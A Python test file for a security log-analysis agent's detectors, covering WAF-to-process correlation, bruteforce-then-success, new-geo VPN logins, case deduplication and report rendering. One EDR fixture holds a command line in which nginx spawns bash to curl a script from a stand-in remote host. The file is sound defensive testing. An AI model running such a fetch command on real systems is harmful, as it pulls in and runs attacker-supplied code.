"""Detector rule tests for log analysis.
日志分析检测器规则测试。"""

from __future__ import annotations

import json

from agent_py_agent.agent.log_analysis.analytics.detectors import (
    bruteforce_then_success,
    run_soft_detectors,
    waf_attack_success_candidate,
)
from agent_py_agent.agent.log_analysis.cases.case_store import CaseStore, dedup_key_for_finding
from agent_py_agent.agent.log_analysis.models import EvidenceRef, Finding, QueryPlan
from agent_py_agent.agent.log_analysis.reports import (
    first_response_report_content,
    forensic_package_content,
)
from agent_py_agent.agent.log_analysis.security.correlation import build_route_draft


# ── Shared event fixtures ─────────────────────────────────────────────────────

_WAF_EVENT = {
    "event_id": "waf-1",
    "event_time": "2026-04-30T10:00:00Z",
    "source_id": "waf-prod",
    "source_product": "waf",
    "event_class": "alert",
    "event_action": "detected",
    "severity": "high",
    "alert_type": "web_attack",
    "threat_name": "generic command execution",
    "uri": "/upload.php",
    "attacker_ip": "198.51.100.10",
    "victim_ip": "10.0.0.5",
    "raw_ref": "raw-waf:line-1",
}

_EDR_EVENT = {
    "event_id": "edr-1",
    "event_time": "2026-04-30T10:02:00Z",
    "source_id": "edr-prod",
    "source_product": "edr",
    "event_class": "process",
    "event_action": "process_start",
    "victim_ip": "10.0.0.5",
    "host": "web-01",
    "parent_process_name": "nginx",
    "process_name": "bash",
    "cmdline": "bash -c curl http://203.0.113.77/a.sh",
    "raw_ref": "raw-edr:line-7",
}

_NETFLOW_EVENT = {
    "event_id": "net-1",
    "event_time": "2026-04-30T10:03:00Z",
    "source_id": "netflow-prod",
    "source_product": "netflow",
    "event_class": "network",
    "event_action": "connect",
    "src_ip": "10.0.0.5",
    "dst_ip": "203.0.113.77",
    "dst_port": 443,
    "rare": True,
    "raw_ref": "raw-net:line-2",
}

_VPN_LOGIN_EVENT = {
    "event_id": "vpn-1",
    "event_time": "2026-04-30T11:00:00Z",
    "source_id": "vpn-prod",
    "source_product": "vpn",
    "event_class": "auth",
    "event_action": "login",
    "event_outcome": "success",
    "user": "alice",
    "src_ip": "198.51.100.30",
    "country": "ZZ",
    "new_geo": True,
    "raw_ref": "raw-vpn:line-1",
}


def _auth_failure_events() -> list[dict]:
    """Build auth failure events for bob (used in bruteforce tests)."""
    return [
        {
            "event_id": f"auth-fail-{index}",
            "event_time": f"2026-04-30T11:0{index}:00Z",
            "source_id": "sso-prod",
            "source_product": "sso",
            "event_class": "auth",
            "event_action": "login",
            "event_outcome": "failure",
            "user": "bob",
            "src_ip": "198.51.100.44",
            "raw_ref": f"raw-sso:line-{index}",
        }
        for index in range(5)
    ]


def _auth_success_event() -> dict:
    """Build auth success event for bob."""
    return {
        "event_id": "auth-success",
        "event_time": "2026-04-30T11:06:00Z",
        "source_id": "sso-prod",
        "source_product": "sso",
        "event_class": "auth",
        "event_action": "login",
        "event_outcome": "success",
        "user": "bob",
        "src_ip": "198.51.100.44",
        "host": "app-01",
        "raw_ref": "raw-sso:line-9",
    }


def _events() -> list[dict]:
    """Full event set: WAF alert, EDR process, netflow, VPN login, bruteforce sequence, success."""
    return [
        _WAF_EVENT,
        _EDR_EVENT,
        _NETFLOW_EVENT,
        _VPN_LOGIN_EVENT,
    ] + _auth_failure_events() + [_auth_success_event()]


def test_soft_detectors_emit_required_finding_fields():
    """LLM: Tests that all soft detectors emit findings with required fields: hypothesis, confidence, evidence_refs, gaps, next_queries."""
    findings = run_soft_detectors(_events())
    detector_ids = {finding.detector_id for finding in findings}

    assert {
        "waf_attack_success_candidate",
        "web_to_process_anomaly",
        "vpn_new_geo_login",
        "bruteforce_then_success",
        "rare_egress_after_alert",
        "multi_source_weak_signal",
    }.issubset(detector_ids)

    for finding in findings:
        assert finding.hypothesis
        assert finding.confidence is not None and finding.confidence > 0
        assert finding.evidence_refs
        assert all(isinstance(ref, EvidenceRef) for ref in finding.evidence_refs)
        assert finding.gaps
        assert finding.next_queries
        assert finding.rule_version == "v1"


def test_detector_next_queries_are_structured_and_round_trip_readable():
    """LLM: Tests that detector next_queries are structured dicts that round-trip through JSON serialization."""
    finding = next(item for item in run_soft_detectors(_events()) if item.detector_id == "waf_attack_success_candidate")
    query = finding.next_queries[0]

    assert isinstance(query, dict)
    assert {
        "purpose",
        "source_products",
        "start_time",
        "end_time",
        "filters",
        "limit",
        "evidence_needed",
        "display",
    }.issubset(query)
    assert query["source_products"]
    assert query["start_time"] <= "2026-04-30T10:00:00Z" <= query["end_time"]
    assert query["filters"]["src_ip"] == "198.51.100.10"
    assert query["filters"]["victim_ip"] == "10.0.0.5"
    assert query["limit"] > 0

    loaded = Finding.from_json(finding.to_json())
    assert loaded.to_dict() == finding.to_dict()
    assert loaded.attributes["gap_details"]
    gap_detail = loaded.attributes["gap_details"][0]
    assert "time_window" in gap_detail
    assert "entity" in gap_detail
    assert gap_detail.get("missing_telemetry") or gap_detail.get("missing_field")


def test_report_renders_structured_query_plan_as_human_text():
    """LLM: Tests that first_response_report_content renders structured QueryPlan dicts as human-readable text."""
    finding = Finding(
        finding_id="finding-query-plan",
        detector_id="manual",
        risk_score=0.7,
        confidence=0.7,
        evidence_refs=[EvidenceRef(evidence_id="raw-1")],
        hypothesis="manual hypothesis",
        gaps=["needs EDR process evidence"],
        next_queries=[
            QueryPlan(
                purpose="Trace process tree",
                source_products=["edr"],
                start_time="2026-04-30T09:45:00Z",
                end_time="2026-04-30T10:30:00Z",
                filters={"victim_ip": "10.0.0.5"},
                limit=50,
                evidence_needed=["process_tree"],
            ).to_dict()
        ],
    )
    route = build_route_draft(
        {
            "case_id": "case-query-plan",
            "title": "query plan render",
            "finding_refs": [finding.finding_id],
            "attributes": {"finding_summaries": [finding.to_dict()]},
        }
    )

    report = first_response_report_content({"case_id": "case-query-plan", "title": "query plan render"}, route)
    assert "Trace process tree" in report
    assert "sources=edr" in report
    assert "filters: victim_ip=10.0.0.5" in report
    assert "{'purpose'" not in report
    assert '"purpose"' not in report


def test_missing_event_time_does_not_create_window_correlation():
    """LLM: Tests that WAF-EDR correlation detector skips events missing event_time to avoid false windows."""
    events = [
        {
            "event_id": "waf-missing-time-1",
            "event_time": "2026-04-30T10:00:00Z",
            "source_product": "waf",
            "event_class": "alert",
            "event_action": "detected",
            "severity": "high",
            "alert_type": "web_attack",
            "uri": "/upload.php",
            "attacker_ip": "198.51.100.10",
            "victim_ip": "10.0.0.5",
        },
        {
            "event_id": "edr-missing-time-1",
            "source_product": "edr",
            "event_class": "process",
            "event_action": "process_start",
            "victim_ip": "10.0.0.5",
            "parent_process_name": "nginx",
            "process_name": "bash",
        },
    ]

    assert waf_attack_success_candidate(events) == []


def test_bruteforce_requires_timed_failures_in_window():
    """LLM: Tests that bruteforce detector requires failures with timestamps within the time window."""
    events = [
        {
            "event_id": f"auth-missing-time-{index}",
            "source_product": "sso",
            "event_class": "auth",
            "event_action": "login",
            "event_outcome": "failure",
            "user": "alice",
            "src_ip": "198.51.100.44",
        }
        for index in range(5)
    ]
    events.append(
        {
            "event_id": "auth-success-with-time",
            "event_time": "2026-04-30T11:06:00Z",
            "source_product": "sso",
            "event_class": "auth",
            "event_action": "login",
            "event_outcome": "success",
            "user": "alice",
            "src_ip": "198.51.100.44",
        }
    )

    assert bruteforce_then_success(events) == []


def test_credential_case_dedup_includes_account_but_web_dedup_stays_asset_based(tmp_path):
    """LLM: Tests that credential dedup keys include account while web dedup keys stay asset-based."""
    store = CaseStore(tmp_path, min_case_confidence=0.6)
    findings = [
        finding
        for finding in run_soft_detectors(
            [
                {
                    "event_id": "vpn-alice",
                    "event_time": "2026-04-30T11:00:00Z",
                    "source_product": "vpn",
                    "event_class": "auth",
                    "event_action": "login",
                    "event_outcome": "success",
                    "user": "alice",
                    "src_ip": "198.51.100.30",
                    "country": "ZZ",
                    "new_geo": True,
                },
                {
                    "event_id": "vpn-bob",
                    "event_time": "2026-04-30T11:01:00Z",
                    "source_product": "vpn",
                    "event_class": "auth",
                    "event_action": "login",
                    "event_outcome": "success",
                    "user": "bob",
                    "src_ip": "198.51.100.30",
                    "country": "ZZ",
                    "new_geo": True,
                },
            ]
        )
        if finding.detector_id == "vpn_new_geo_login"
    ]

    assert len(findings) == 2
    assert {dedup_key_for_finding(finding) for finding in findings} == {
        "attack=198.51.100.30|account=alice|victim=unknown|bucket=2026-04-30T11:00:00Z",
        "attack=198.51.100.30|account=bob|victim=unknown|bucket=2026-04-30T11:00:00Z",
    }
    cases = store.record_findings(findings)
    assert len(cases) == 2

    web_findings = [finding for finding in run_soft_detectors(_events()) if finding.detector_id == "waf_attack_success_candidate"]
    assert len(web_findings) == 1
    assert dedup_key_for_finding(web_findings[0]) == "attack=198.51.100.10|victim=10.0.0.5|bucket=2026-04-30T10:00:00Z"
